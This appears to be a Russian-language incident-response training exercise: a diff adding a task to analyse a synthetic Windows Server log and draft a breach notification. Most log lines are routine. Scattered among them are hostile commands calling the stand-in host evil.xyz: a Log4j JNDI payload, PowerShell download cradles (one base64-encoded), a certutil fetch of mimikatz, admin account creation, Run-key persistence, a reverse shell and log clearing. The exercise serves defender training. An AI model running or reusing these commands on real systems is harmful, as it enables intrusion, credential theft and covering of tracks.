@@ -1,0 +1,136 @@
+Проанализировать фрагмент лог-файла. Выяснить какое событие ИБ в нем зафиксировано. Составить необходимое уведомление.
+
+2025-04-02 08:00:01 [Info] System: Windows Server 2022 Datacenter started. Last boot: 2025-04-01 22:15:32.
+2025-04-02 08:00:22 [Info] Security: User DOMAIN\svc_backup logged on successfully (Logon Type 3 - Network).
+2025-04-02 08:01:05 [Info] IIS: Website "Default Web Site" started successfully on port 80.
+2025-04-02 08:01:47 [Info] Security: User DOMAIN\sqlservice logged on successfully (Logon Type 5 - Service).
+2025-04-02 08:02:13 [Info] System: Windows Defender Antivirus signature version 1.435.890.0 has been updated.
+2025-04-02 08:03:01 [Info] HTTPD: GET /images/logo.png 200 0:0:0:0:0:0:0:1 Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0.0.0
+2025-04-02 08:03:45 [Info] Security: User DOMAIN\webapp logged on successfully (Logon Type 4 - Batch).
+2025-04-02 08:04:22 [Info] Process: User DOMAIN\svc_backup started process "C:\Windows\System32\ntbackup.exe" (PID 1104).
+2025-04-02 08:05:07 [Info] Network: Outbound connection to 13.107.21.240:443 (Windows Update) - allowed.
+2025-04-02 08:05:49 [Warning] System: Low virtual memory (only 512 MB available).
+2025-04-02 08:06:33 [Info] HTTPD: POST /api/login 200 192.168.1.105 application/json - user "asmith" authenticated.
+2025-04-02 08:07:15 [Info] Security: User DOMAIN\asmith logged off successfully.
+2025-04-02 08:07:58 [Info] IIS: Application pool "DefaultAppPool" recycled due to idle timeout.
+2025-04-02 08:08:34 [Info] Process: User DOMAIN\webapp started process "C:\Windows\System32\inetsrv\w3wp.exe" (PID 1221).
+2025-04-02 08:09:11 [Info] Network: Inbound connection from 10.0.0.45:49233 to 10.0.0.10:3389 (RDP) - allowed.
+2025-04-02 08:09:56 [Info] HTTPD: GET /js/jquery.min.js 304 192.168.1.200 - local referrer.
+2025-04-02 08:10:40 [Error] Security: Failed logon attempt for user "Administrator" from IP 10.0.0.200 (Logon Type 3). Error: The user name or password is incorrect.
+2025-04-02 08:11:18 [Info] System: Scheduled task "Microsoft\Windows\DiskCleanup\SilentCleanup" completed.
+2025-04-02 08:12:02 [Info] HTTPD: POST /search 200 192.168.1.105 application/x-www-form-urlencoded - query "server logs".
+2025-04-02 08:12:47 [Info] Security: User DOMAIN\bwilson logged on successfully (Logon Type 2 - Interactive).
+2025-04-02 08:13:29 [Warning] Antivirus: Real-time protection scan skipped file "C:\inetpub\wwwroot\large.bin" due to size limit.
+2025-04-02 08:14:13 [Info] Process: User DOMAIN\bwilson started process "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" (PID 1345).
+2025-04-02 08:14:58 [Info] HTTPD: GET /favicon.ico 404 203.0.113.55 - direct request.
+2025-04-02 08:15:36 [Info] Print: User DOMAIN\bwilson printed document "Q2_report.docx" to printer "HP_LaserJet_M402".
+2025-04-02 08:16:14 [Info] Network: Outbound connection to 8.8.8.8:53 (DNS for google.com) - allowed.
+2025-04-02 08:17:01 [Critical] HTTPD: POST /vulnerable/upload 500 198.51.100.77 multipart/form-data - file "shell.jsp" rejected by extension filter.
+2025-04-02 08:17:43 [Info] Security: User DOMAIN\sqlservice logged off successfully.
+2025-04-02 08:18:25 [Info] System: Windows Update installed update KB5037778 successfully.
+2025-04-02 08:19:09 [Info] Process: User DOMAIN\webapp started process "C:\Windows\System32\cscript.exe" (PID 1401) - legitimate script "C:\inetpub\adminscripts\adsutil.vbs".
+2025-04-02 08:19:51 [Info] HTTPD: GET /css/styles.css 200 192.168.1.105 - normal static asset.
+2025-04-02 08:20:37 [Error] HTTPD: POST /api/upload 413 198.51.100.22 - file too large (10 MB limit).
+2025-04-02 08:21:15 [Info] Security: User DOMAIN\asmith logged on successfully (Logon Type 10 - RemoteInteractive).
+2025-04-02 08:22:00 [Info] System: Service "Windows Time" synchronized with time.windows.com.
+2025-04-02 08:22:44 [Info] HTTPD: GET /downloads/whitepaper.pdf 200 203.0.113.89 - download request.
+2025-04-02 08:23:28 [Info] Process: User DOMAIN\asmith started process "C:\Windows\System32\notepad.exe" (PID 1523).
+2025-04-02 08:24:11 [Info] Network: Inbound connection from 10.0.0.100:445 to 10.0.0.10:445 (SMB) - allowed.
+2025-04-02 08:24:56 [Warning] Antivirus: Real-time protection detected and quarantined test file "eicar.com" (user-initiated scan). No threat.
+2025-04-02 08:25:39 [Info] Security: User DOMAIN\bwilson opened file "\\fs\share\budget.xlsx" (Read access).
+2025-04-02 08:26:23 [Info] HTTPD: POST /search 200 192.168.1.105 - normal query "annual report".
+2025-04-02 08:27:07 [Info] System: The Windows Backup service started a differential backup.
+2025-04-02 08:27:50 [Error] HTTPD: POST /api/command 404 198.51.100.77 - endpoint not found.
+2025-04-02 08:28:34 [Info] Process: User DOMAIN\webapp started process "C:\Windows\System32\wbem\wmiprvse.exe" (PID 1689) - WMI provider host.
+2025-04-02 08:29:18 [Info] Security: User DOMAIN\svc_backup logged off successfully.
+2025-04-02 08:30:02 [Info] HTTPD: GET /images/banner.jpg 200 192.168.1.200 - normal traffic.
+2025-04-02 08:30:46 [Info] Print: User DOMAIN\asmith printed document "notes.txt" to printer "Microsoft Print to PDF".
+2025-04-02 08:31:30 [Critical] HTTPD: POST /vulnerable/log 200 203.0.113.202 - payload "${jndi:ldap://evil.xyz:1389/Exploit}" in User-Agent header. (Log4j exploitation attempt)
+2025-04-02 08:32:14 [Info] System: Windows Defender Antivirus performed a quick scan. No threats found.
+2025-04-02 08:32:58 [Info] Process: w3wp.exe (PID 1221) started process "C:\Windows\System32\cmd.exe" (PID 1756) with arguments "/c whoami". Parent PID 1221 (User: IIS APPPOOL\DefaultAppPool).
+2025-04-02 08:33:42 [Info] Process: cmd.exe (PID 1756) exited with code 0. Output captured to "C:\Windows\Temp\out.tmp".
+2025-04-02 08:34:26 [Info] HTTPD: GET /admin/login.aspx 200 192.168.1.105 - normal admin panel access.
+2025-04-02 08:35:10 [Info] Security: User DOMAIN\cjackson logged on successfully (Logon Type 3 - Network).
+2025-04-02 08:35:54 [Info] Network: Outbound connection to 52.113.194.132:443 (Azure CDN) - allowed.
+2025-04-02 08:36:38 [Info] Process: w3wp.exe (PID 1221) started process "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" (PID 1845) with arguments "-NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.xyz/ps.ps1')". Parent PID 1221.
+2025-04-02 08:37:22 [Warning] Antivirus: Real-time protection blocked network connection from powershell.exe (PID 1845) to 185.130.5.253:80 (URL http://evil.xyz/ps.ps1) - detection: Trojan:PowerShell/ReverseShell.A!rfn. Action: Blocked.
+2025-04-02 08:38:06 [Info] System: Scheduled task "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" started.
+2025-04-02 08:38:50 [Info] Security: User DOMAIN\cjackson opened file "\\fs\public\policy.pdf" (Read access).
+2025-04-02 08:39:34 [Info] Process: powershell.exe (PID 1845) was terminated by Antivirus after detection.
+2025-04-02 08:40:18 [Info] HTTPD: GET /error/404.html 404 203.0.113.55 - random scanner.
+2025-04-02 08:41:02 [Error] Security: Unsuccessful attempt to modify Windows Firewall rule "Remote Desktop" from process w3wp.exe (PID 1221). Access denied (requires elevated privileges).
+2025-04-02 08:41:46 [Info] Print: User DOMAIN\cjackson printed document "contract.pdf" to printer "Canon_MF740".
+2025-04-02 08:42:30 [Info] Network: Outbound connection to 20.42.65.90:443 (HTTPS to microsoft.com) - allowed.
+2025-04-02 08:43:14 [Critical] HTTPD: POST /vulnerable/log 200 185.130.5.253 - payload "${jndi:ldap://185.130.5.253:1389/EvilClass}" in X-Forwarded-For header. (Second exploitation attempt, likely same attacker)
+2025-04-02 08:43:58 [Info] Process: w3wp.exe (PID 1221) started process "C:\Windows\System32\cmd.exe" (PID 2012) with arguments "/c net user tempuser P@ssw0rd123 /add". Parent PID 1221.
+2025-04-02 08:44:42 [Info] Security: New local user "tempuser" was created by process cmd.exe (PID 2012) under context IIS APPPOOL\DefaultAppPool.
+2025-04-02 08:45:26 [Info] Process: cmd.exe (PID 2012) started process "C:\Windows\System32\net.exe" (PID 2078) with arguments "localgroup Administrators tempuser /add".
+2025-04-02 08:46:10 [Info] Security: User "tempuser" was added to group "Administrators" by process net.exe (PID 2078).
+2025-04-02 08:46:54 [Info] System: Windows Defender Antivirus definitions updated to version 1.435.891.0.
+2025-04-02 08:47:38 [Info] HTTPD: GET /images/favicon.ico 404 192.168.1.105 - missing icon.
+2025-04-02 08:48:22 [Info] Network: Inbound connection from 10.0.0.77:49212 to 10.0.0.10:445 (SMB) - allowed.
+2025-04-02 08:49:06 [Info] Process: w3wp.exe (PID 1221) started process "C:\Windows\System32\schtasks.exe" (PID 2156) with arguments "/create /tn 'Microsoft\Windows\Update\SecurityScan' /tr 'C:\Windows\System32\cmd.exe /c powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAnACkA' /sc daily /st 03:00". Parent PID 1221.
+2025-04-02 08:50:50 [Info] System: Scheduled task "Microsoft\Windows\Update\SecurityScan" created successfully by user NT AUTHORITY\SYSTEM (via schtasks.exe).
+2025-04-02 08:51:34 [Info] Security: User DOMAIN\bwilson logged off successfully.
+2025-04-02 08:52:18 [Info] Process: schtasks.exe (PID 2156) exited normally.
+2025-04-02 08:53:02 [Info] HTTPD: GET /downloads/whitepaper.pdf 200 203.0.113.89 - repeated download.
+2025-04-02 08:53:46 [Warning] Antivirus: Real-time protection scan delayed due to high CPU usage.
+2025-04-02 08:54:30 [Info] Network: Outbound connection to 185.130.5.253:4444 (TCP) from process cmd.exe (PID 2012) - allowed by temporary firewall rule? (No rule logged)
+2025-04-02 08:55:14 [Info] Process: cmd.exe (PID 2012) started process "C:\Windows\System32\cmd.exe" (PID 2289) with arguments "/c certutil -urlcache -f http://evil.xyz/mimikatz.exe C:\Windows\Temp\m.exe".
+2025-04-02 08:55:58 [Info] Process: certutil.exe (PID 2345) downloaded file from "http://evil.xyz/mimikatz.exe" to "C:\Windows\Temp\m.exe" (size 1.2 MB).
+2025-04-02 08:56:42 [Error] Antivirus: Detection of HackTool:Win32/Mimikatz!rfn in file "C:\Windows\Temp\m.exe". File quarantined. Action: Quarantine.
+2025-04-02 08:57:26 [Info] HTTPD: POST /api/heartbeat 200 185.130.5.253 - JSON payload {"status":"ok","hostname":"SRV-WEB01"}.
+2025-04-02 08:58:10 [Info] Security: User DOMAIN\asmith logged off successfully.
+2025-04-02 08:58:54 [Info] System: Windows Update service started checking for updates.
+2025-04-02 08:59:38 [Info] Process: w3wp.exe (PID 1221) started process "C:\Windows\System32\reg.exe" (PID 2412) with arguments "add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\System32\cmd.exe /c C:\Windows\Temp\backdoor.exe /f".
+2025-04-02 09:00:22 [Info] Registry: Value "Updater" added to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run by process reg.exe (PID 2412) under IIS APPPOOL\DefaultAppPool (elevation via SeTakeOwnershipPrivilege?).
+2025-04-02 09:01:06 [Info] Security: User DOMAIN\cjackson logged off successfully.
+2025-04-02 09:01:50 [Info] Network: Inbound connection from 185.130.5.253:54322 to 10.0.0.10:4444 (TCP) - reverse shell session established. Process cmd.exe (PID 2289) acting as server.
+2025-04-02 09:02:34 [Info] Process: cmd.exe (PID 2289) started process "C:\Windows\System32\whoami.exe" (PID 2501) with arguments "/all". Parent PID 2289 (remote interactive).
+2025-04-02 09:03:18 [Info] Process: whoami.exe (PID 2501) exited with code 0.
+2025-04-02 09:04:02 [Info] System: Event log "Security" was cleared by user NT AUTHORITY\SYSTEM (Event ID 1102). Category: Log Clear.
+2025-04-02 09:04:46 [Info] Process: cmd.exe (PID 2289) started process "C:\Windows\System32\wevtutil.exe" (PID 2589) with arguments "cl System".
+2025-04-02 09:05:30 [Info] System: Event log "System" was cleared by user NT AUTHORITY\SYSTEM.
+2025-04-02 09:06:14 [Info] HTTPD: GET / 200 192.168.1.200 - normal home page.
+2025-04-02 09:06:58 [Info] Security: User DOMAIN\webapp logged off successfully.
+2025-04-02 09:07:42 [Info] Network: Outbound connection to 34.120.216.41:443 (Google Cloud) - allowed.
+2025-04-02 09:08:26 [Info] Process: w3wp.exe (PID 1221) terminated unexpectedly. Faulting module: unknown. Crash dump created.
+2025-04-02 09:09:10 [Info] IIS: Application pool "DefaultAppPool" automatically restarted w3wp.exe (new PID 2678).
+2025-04-02 09:09:54 [Info] Security: User DOMAIN\svc_backup logged on successfully (Logon Type 3).
+2025-04-02 09:10:38 [Info] Print: User DOMAIN\cjackson printed document "backup_report.pdf" to printer "HP_LaserJet_M402".
+2025-04-02 09:11:22 [Info] HTTPD: POST /api/login 200 192.168.1.105 - user "asmith" authenticated.
+2025-04-02 09:12:06 [Info] System: Scheduled task "SecurityScan" started (triggered manually by attacker? Time 09:12:06 not scheduled 03:00).
+2025-04-02 09:12:50 [Info] Process: cmd.exe (PID 2789) started by task "SecurityScan" with arguments "/c powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAnACkA".
+2025-04-02 09:13:34 [Error] Antivirus: Real-time protection blocked execution of encoded PowerShell from scheduled task. Detection: Trojan:PowerShell/CobaltStrike!rfn.
+2025-04-02 09:14:18 [Info] System: Windows Defender Antivirus scan completed. 0 threats found (note: some threats were blocked in real-time).
+2025-04-02 09:15:02 [Info] Security: User DOMAIN\asmith logged off successfully.
+2025-04-02 09:15:46 [Info] Network: Outbound connection to 8.8.4.4:53 (DNS) - allowed.
+2025-04-02 09:16:30 [Info] HTTPD: GET /robots.txt 404 203.0.113.77 - scanner.
+2025-04-02 09:17:14 [Info] Process: User DOMAIN\bwilson started process "C:\Program Files\Windows Defender\MSASCui.exe" (PID 2901) - manual scan initiated.
+2025-04-02 09:17:58 [Info] Security: User DOMAIN\cjackson logged on successfully (Logon Type 2).
+2025-04-02 09:18:42 [Info] System: The Windows Time service has not synchronized for 30 minutes.
+2025-04-02 09:19:26 [Info] Print: User DOMAIN\bwilson printed document "meeting_agenda.txt" to printer "Microsoft Print to PDF".
+2025-04-02 09:20:10 [Info] HTTPD: GET /images/logo.png 304 192.168.1.200 - cached.
+2025-04-02 09:20:54 [Info] Process: User DOMAIN\cjackson started process "C:\Windows\System32\calc.exe" (PID 3056).
+2025-04-02 09:21:38 [Info] Security: User DOMAIN\sqlservice logged on successfully (Logon Type 5).
+2025-04-02 09:22:22 [Info] Network: Inbound connection from 10.0.0.45:3389 to 10.0.0.10:3389 (RDP) - allowed.
+2025-04-02 09:23:06 [Info] System: Scheduled task "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" completed.
+2025-04-02 09:23:50 [Warning] Antivirus: Real-time protection detected process "C:\Windows\Temp\backdoor.exe" (PID 3123) attempting to connect to 185.130.5.253:4443. Process terminated. Detection: Backdoor:Win32/Agent.A!rfn.
+2025-04-02 09:24:34 [Info] Security: User "tempuser" logged on locally (Logon Type 2) from console. (Attacker using created admin account)
+2025-04-02 09:25:18 [Info] Process: User tempuser started process "C:\Windows\System32\cmd.exe" (PID 3189) with elevated token.
+2025-04-02 09:26:02 [Info] Security: User tempuser added new firewall rule "Allow All" using netsh.exe.
+2025-04-02 09:26:46 [Info] Network: Outbound connection to 185.130.5.253:443 (HTTPS) from cmd.exe (PID 3189) - encrypted C2 traffic.
+2025-04-02 09:27:30 [Info] System: Windows Backup service stopped unexpectedly. Error: Access denied.
+2025-04-02 09:28:14 [Info] HTTPD: GET /admin/config.jsp 200 185.130.5.253 - direct access to web shell.
+2025-04-02 09:28:58 [Info] Process: w3wp.exe (new PID 2678) started process "C:\Windows\System32\rundll32.exe" (PID 3256) with arguments "C:\Windows\Temp\evil.dll,Start".
+2025-04-02 09:29:42 [Error] Antivirus: Real-time protection failed to quarantine "C:\Windows\Temp\evil.dll" due to file in use. Manual cleanup required.
+2025-04-02 09:30:26 [Info] Security: User DOMAIN\webapp logged on successfully (Logon Type 4).
+2025-04-02 09:31:10 [Info] System: Windows Defender Antivirus definitions update failed (0x80072ee7). Network connectivity issue.
+2025-04-02 09:31:54 [Info] Network: Inbound connection from 198.51.100.77:12345 to 10.0.0.10:80 (HTTP) - suspicious GET /shell.jsp (200 OK) served by w3wp.exe.
+2025-04-02 09:32:38 [Info] HTTPD: GET /shell.jsp?cmd=dir 200 198.51.100.77 - web shell command execution.
+2025-04-02 09:33:22 [Info] Process: w3wp.exe (PID 2678) started process "C:\Windows\System32\cmd.exe" (PID 3341) with arguments "/c dir C:\".
+2025-04-02 09:34:06 [Info] Security: User tempuser logged off successfully.
+2025-04-02 09:34:50 [Info] Print: User DOMAIN\asmith printed document "server_status.html" to printer "HP_LaserJet_M402".
+2025-04-02 09:35:34 [Info] System: The server is shutting down due to critical error (User initiated? No).
+2025-04-02 09:36:18 [Info] Security: System shutdown initiated by user NT AUTHORITY\SYSTEM (via Winlogon).
+2025-04-02 09:36:50 [Info] System: Windows Server 2022 Datacenter shutdown complete.
